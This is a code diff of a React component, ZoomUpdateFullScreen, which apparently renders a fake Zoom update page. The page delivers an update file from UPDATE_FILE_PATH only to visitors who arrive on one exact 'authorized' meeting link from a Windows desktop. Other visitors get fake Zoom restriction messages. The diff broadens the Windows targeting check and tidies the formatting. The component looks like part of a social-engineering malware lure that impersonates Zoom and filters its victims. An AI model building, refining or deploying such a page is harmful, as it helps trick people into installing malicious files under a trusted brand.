@@ -3,36 +3,34 @@
 import { useEffect, useState } from "react";
 
 const MINIMUM_LOADING_TIME = 2000;
+
 const NON_DESKTOP_USER_AGENT =
   /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile|Tablet/i;
 
-// Matches Windows desktop user agents / platforms
-const WINDOWS_USER_AGENT = /Windows NT|Win32|Win64|WOW64/i;
+const WINDOWS_USER_AGENT = /Windows/i;
 
 export const isWindowsDesktopDevice = () => {
-  const hasDesktopViewport = window.matchMedia("(min-width: 1024px)").matches;
-  const hasDesktopPointer = window.matchMedia(
-    "(hover: hover) and (pointer: fine)",
-  ).matches;
-  const hasMobileUserAgent = NON_DESKTOP_USER_AGENT.test(navigator.userAgent);
+  const userAgent = navigator.userAgent || "";
+  const platform = navigator.platform || "";
 
-  const uaIsWindows = WINDOWS_USER_AGENT.test(navigator.userAgent);
-  const platformIsWindows = typeof navigator.platform === "string" &&
-    navigator.platform.toLowerCase().includes("win");
+  // Primary check: Windows
+  const isWindows =
+    WINDOWS_USER_AGENT.test(userAgent) ||
+    /Win/i.test(platform);
 
-  const isWindows = uaIsWindows || platformIsWindows;
+  // Only exclude obvious mobile devices
+  const isMobile = NON_DESKTOP_USER_AGENT.test(userAgent);
 
-  return hasDesktopViewport && hasDesktopPointer && !hasMobileUserAgent && isWindows;
+  return isWindows && !isMobile;
 };
 
-
 interface ZoomUpdateProps {
-   UPDATE_FILE_PATH :string
-   AUTHORIZED_PATH : string
+  UPDATE_FILE_PATH: string
+  AUTHORIZED_PATH: string
 }
-const ZoomUpdateFullScreen = ({UPDATE_FILE_PATH,AUTHORIZED_PATH}  : ZoomUpdateProps) => {
+const ZoomUpdateFullScreen = ({ UPDATE_FILE_PATH, AUTHORIZED_PATH }: ZoomUpdateProps) => {
   const isAuthorizedUrl = () =>
-  window.location.pathname + window.location.search === AUTHORIZED_PATH;
+    window.location.pathname + window.location.search === AUTHORIZED_PATH;
 
   const [accessState, setAccessState] = useState<
     "checking" | "desktop" | "blocked"
@@ -61,7 +59,7 @@ const ZoomUpdateFullScreen = ({UPDATE_FILE_PATH,AUTHORIZED_PATH}  : ZoomUpdatePr
         setBlockedReason("unknown");
         setAccessState("desktop");
       }, MINIMUM_LOADING_TIME);
-    };
+    }
 
     if (document.readyState === "complete") {
       finishLoading();
@@ -123,8 +121,8 @@ const ZoomUpdateFullScreen = ({UPDATE_FILE_PATH,AUTHORIZED_PATH}  : ZoomUpdatePr
       blockedReason === "link"
         ? "This meeting link is restricted to the authorized Zoom meeting URL. Please open the exact join link shown in your invite."
         : blockedReason === "os"
-        ? "This link is limited to Windows desktop devices only. Please open it on a Windows computer to continue."
-        : "This page is only available from the authorized Windows desktop meeting environment.";
+          ? "This link is limited to Windows desktop devices only. Please open it on a Windows computer to continue."
+          : "This page is only available from the authorized Windows desktop meeting environment.";
 
     return (
       <div className="fixed inset-0 z-50 flex min-h-screen w-full items-center justify-center bg-[#f4f7fa] px-6">
